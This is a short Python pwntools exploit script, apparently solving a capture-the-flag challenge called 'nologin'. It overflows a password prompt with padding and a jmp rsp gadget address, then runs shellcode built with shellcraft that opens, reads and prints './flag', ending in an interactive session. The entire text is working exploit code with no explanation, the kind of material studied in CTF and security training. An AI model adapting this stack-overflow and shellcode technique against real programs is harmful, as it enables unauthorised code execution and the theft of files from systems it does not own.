from pwn import *

p = process('./nologin')

#--------------------------
pop_rdi_ret = 0x0000000000401173 #pop rdi ; ret
pop_rsi_r15_ret = 0x0000000000401171

leave_ret = 0x000000000040095b

mmap = 0x602000
orw_payload=shellcraft.open('./flag')           
orw_payload+=shellcraft.read(3,mmap,0x50)       
orw_payload+=shellcraft.write(1,mmap,0x50)     

jmp_rsp = 0x00000000004016fb
#--------------------------

print len(orw_payload)

#attach(p,'b *0x000000000400FFC')
p.recvuntil('input>> \n')
p.sendline('2')
p.recvuntil('>password: \n')
payload = 'a'*0x5 + 'junkjunk' + p64(0x00000000004016fb) + asm(orw_payload)
print len(payload)

pause()
p.sendline(payload)
pause()
p.interactive()